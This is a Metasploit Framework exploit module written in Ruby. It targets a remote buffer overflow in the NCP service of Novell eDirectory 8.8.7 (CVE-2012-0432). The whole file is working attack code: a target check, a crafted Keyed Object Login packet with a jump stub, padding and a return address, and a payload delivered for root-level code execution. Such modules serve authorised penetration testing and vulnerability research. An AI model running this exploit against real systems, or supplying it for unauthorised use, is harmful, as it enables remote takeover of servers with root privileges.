##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            'Name'            => 'Novell eDirectory 8 Buffer Overflow',
            'Description'     => %q{
                    This exploit abuses a buffer overflow vulnerability in Novell eDirectory. The
                vulnerability exists in the ndsd daemon, specifically in the NCP service, while
                parsing a specially crafted Keyed Object Login request. It allows remote code
                execution with root privileges.
            },
            'Author'          =>
                [
                    'David Klein', # Vulnerability Discovery
                    'Gary Nilson', # Exploit
                    'juan vazquez' # Metasploit module
                ],
            'References'      =>
                [
                    [ 'CVE', '2012-0432'],
                    [ 'OSVDB', '88718'],
                    [ 'BID', '57038' ],
                    [ 'EDB', '24205' ],
                    [ 'URL', 'http://www.novell.com/support/kb/doc.php?id=3426981' ],
                    [ 'URL', 'http://seclists.org/fulldisclosure/2013/Jan/97' ]
                ],
            'DisclosureDate'  => 'Dec 12 2012',
            'Platform'        => 'linux',
            'Privileged'      => true,
            'Arch'            => ARCH_X86,
            'Payload'         =>
                {
 
                },
            'Targets'         =>
                [
                    [ 'Novell eDirectory 8.8.7 v20701.33/ SLES 10 SP3',
                        {
                            'Ret' => 0x080a4697, # jmp esi from ndsd
                            'Offset' => 58
                        }
                    ]
                ],
            'DefaultTarget'   => 0
        ))
 
        register_options([Opt::RPORT(524),], self.class)
    end
 
    def check
        connect
        sock.put(connection_request)
        res = sock.get
        disconnect
        if res.nil? or res[8, 2].unpack("n")[0] != 0x3333 or res[15, 1].unpack("C")[0] != 0
            # res[8,2] => Reply Type
            # res[15,1] => Connection Status
            return Exploit::CheckCode::Safe
        end
        return Exploit::CheckCode::Detected
    end
 
    def connection_request
        pkt =  "\x44\x6d\x64\x54" # NCP TCP id
        pkt << "\x00\x00\x00\x17" # request_size
        pkt << "\x00\x00\x00\x01" # version
        pkt << "\x00\x00\x00\x00" # reply buffer size
        pkt << "\x11\x11"         # cmd => create service connection
        pkt << "\x00"             # sequence number
        pkt << "\x00"             # connection number
        pkt << "\x00"             # task number
        pkt << "\x00"             # reserved
        pkt << "\x00"             # request code
 
        return pkt
    end
 
    def exploit
 
        connect
 
        print_status("Sending Service Connection Request...")
        sock.put(connection_request)
        res = sock.get
        if res.nil? or res[8, 2].unpack("n")[0] != 0x3333 or res[15, 1].unpack("C")[0] != 0
            # res[8,2] => Reply Type
            # res[15,1] => Connection Status
            fail_with(Exploit::Failure::UnexpectedReply, "Service Connection failed")
        end
        print_good("Service Connection successful")
 
        pkt = "\x44\x6d\x64\x54"  # NCP TCP id
        pkt << "\x00\x00\x00\x00" # request_size (filled later)
        pkt << "\x00\x00\x00\x01" # version (1)
        pkt << "\x00\x00\x00\x05" # reply buffer size
        pkt << "\x22\x22"         # cmd
        pkt << "\x01"             # sequence number
        pkt << res[11]            # connection number
        pkt << "\x00"             # task number
        pkt << "\x00"             # reserved
        pkt << "\x17"             # Login Object FunctionCode (23)
        pkt << "\x00\xa7"         # SubFuncStrucLen
        pkt << "\x18"             # SubFunctionCode
        pkt << "\x90\x90"         # object type
        pkt << "\x50"             # ClientNameLen
        pkt << rand_text(7)
        jmp_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+#{target['Offset'] + 4}").encode_string
        pkt << jmp_payload # first byte is the memcpy length, must be bigger than 62 to to overwrite EIP
        pkt << rand_text(target['Offset'] - jmp_payload.length)
        pkt << [target.ret].pack("V")
        pkt << payload.encoded
 
        pkt[4,4] = [pkt.length].pack("N")
 
        print_status("Sending Overflow on Keyed Object Login...")
        sock.put(pkt)
        sock.get
        disconnect
    end
 
end
